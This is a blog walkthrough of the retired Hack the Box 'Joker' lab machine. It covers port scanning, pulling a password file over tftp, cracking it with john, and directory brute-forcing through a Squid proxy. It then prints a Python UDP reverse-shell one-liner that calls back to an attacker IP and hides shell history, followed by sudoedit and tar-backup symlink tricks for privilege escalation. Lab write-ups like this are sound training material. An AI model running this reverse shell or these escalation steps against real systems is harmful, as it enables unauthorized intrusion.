@@ -1,0 +1,403 @@
+
+								
+																		Hack the Box Challenge: Joker Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 30, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Joker” which is lab presented by Hack the Box for making online penetration practices according to your experience level. They have collection of vulnerable labs as challenges from beginners to Expert level. HTB have two partitions of lab i.e. Active and retired since we can’t submit write up of any Active lab therefore we have chosen retried joker lab.
+Level: Intermediate
+Task: find user.txt and root.txt file in victim’s machine.
+Since these labs are online available therefore they have static IP. The IP of Joker is 10.10.10.21 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.21
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.21
+					
+				
+			
+		
+
+From given below image, you can observe we found port 22, 3128 are open in victim’s network.
+
+After completing the Aggressive scan we use UDP scan to further enumerate the ports and find port 69 and 5355 are open.
+
+After finding that the target machine is running tftp, we find a file called passwords we download the file and find that it consist of some hashes.
+
+		
+		
+			
+			
+			
+			
+tftp 10.10.10.21
+tftp &gt; get passwords
+			
+				
+					
+				
+					12
+				
+						tftp 10.10.10.21tftp &gt; get passwords
+					
+				
+			
+		
+
+
+After downloading the file we use john the ripper to crack the hashes using rockyou.txt wordlist. We find the password to be “ihateseafood” for user “kalamari“.
+
+		
+		
+			
+			
+			
+			
+john --wordlist=/usr/share/wordlists/rockyou.txt passwords
+			
+				
+					
+				
+					1
+				
+						john --wordlist=/usr/share/wordlists/rockyou.txt passwords
+					
+				
+			
+		
+
+
+As we know the target machine is running as squid proxy, we configure our browser to redirect the traffic through the target machine.
+
+Now when we try to access the target machine on our browser we are unable to access any page.
+
+Now as we are running redirecting all the traffic through the proxy server we try to open localhost on our browser to check if there are any changes in the behaviour. As soon as we open localhost on our browser we are greeted with a login popup.
+
+We use the password and username we found above by cracking the hashes to login into the page.
+
+We use dirb to enumerate the directories and find /console directory.
+
+		
+		
+			
+			
+			
+			
+dirb http://127.0.0.1 -p 10.10.10.21:3128 -P kalamari:ihateseafood -r
+			
+				
+					
+				
+					1
+				
+						dirb http://127.0.0.1 -p 10.10.10.21:3128 -P kalamari:ihateseafood -r
+					
+				
+			
+		
+
+
+When we open the console directory and found a page that acts as an interpreter for python.
+
+Now we use python reverse shell to gain access to the target machine but TCP reverse shell doesn’t work on the system so we use UDP reverse shell to gain access of the system.
+
+		
+		
+			
+			
+			
+			
+import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.14.3\", 4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])
+			
+				
+					
+				
+					1
+				
+						import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.14.3\", 4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])
+					
+				
+			
+		
+
+
+We use socat to setup our listener as netcat was not able to provide a stable tty shell for us to run our commands.
+
+		
+		
+			
+			
+			
+			
+socat file:’tty’,echo=0,raw udp-listen:4444
+			
+				
+					
+				
+					1
+				
+						socat file:’tty’,echo=0,raw udp-listen:4444
+					
+				
+			
+		
+
+
+After gaining reverse shell we take a look at the sudoers file and find that we can run a command called sudoedit on file /var/www/*/*/layout.html as alekos. Sudo edit is a command that can be use to edit any file on the system.
+
+Enumerating through the directories we find .ssh folder in /home/alekos folder.
+
+Now as the file listed in the sudoers list is using wildcard we can use symlink to link a file that can be edited using sudoedit. As we found the .ssh folder for user alekos we link the authorized_keys with layout.html to edit the authorized_keys and add our keys , so that we can gain access through ssh using our own private key.
+
+		
+		
+			
+			
+			
+			
+cd /var/www/
+cd testing
+mkdir test
+cd test
+ln -s /home/alekos/.ssh/authorized_keys layout.html
+			
+				
+					
+				
+					12345
+				
+						cd /var/www/cd testingmkdir testcd testln -s /home/alekos/.ssh/authorized_keys layout.html
+					
+				
+			
+		
+
+
+Now we use sudoedit as user alekos to edit alekos’s authorized_keys.
+
+		
+		
+			
+			
+			
+			
+sudoedit -u alekos /var/www/testing/test/layout.html
+			
+				
+					
+				
+					1
+				
+						sudoedit -u alekos /var/www/testing/test/layout.html
+					
+				
+			
+		
+
+
+Now we generate keys on our system so that we can copy the public key into authorized_keys and use our private key to login.
+
+		
+		
+			
+			
+			
+			
+ssh-keygen
+			
+				
+					
+				
+					1
+				
+						ssh-keygen
+					
+				
+			
+		
+
+
+Now we open the public key that we just generated and copy it.
+
+		
+		
+			
+			
+			
+			
+cat id_rsa.pub
+			
+				
+					
+				
+					1
+				
+						cat id_rsa.pub
+					
+				
+			
+		
+
+
+We copy it in our target machine and save it.
+
+Now we use the private key we generated to login through ssh to the target machine. As soon as we login through ssh we find user.txt in the home directory of alekos we open it and find the first flag.
+
+		
+		
+			
+			
+			
+			
+ssh -i id_rsa alekos@10.10.10.21
+			
+				
+					
+				
+					1
+				
+						ssh -i id_rsa alekos@10.10.10.21
+					
+				
+			
+		
+
+
+We start enumerating the directories; in the backup directory we find a few tape archive files when we extract them we find that it contains the backup for development directory.
+
+Now we rename the development directory to dev/ and use symlink to link the root directory to the development directory.
+
+		
+		
+			
+			
+			
+			
+mv development dev/
+ln -s root development
+			
+				
+					
+				
+					12
+				
+						mv development dev/ln -s root development
+					
+				
+			
+		
+
+
+We then wait for a few minutes for the file to create backup for the new development folder. As the development is linked to root folder it will create a backup for the root folder. Now we open the new tape archive file that is created and find a file called root.txt we open it and find the final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Nilesh Kumar April 2, 2018 at 3:50 am							
+							
+							
+														
+							
+								Great article!
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
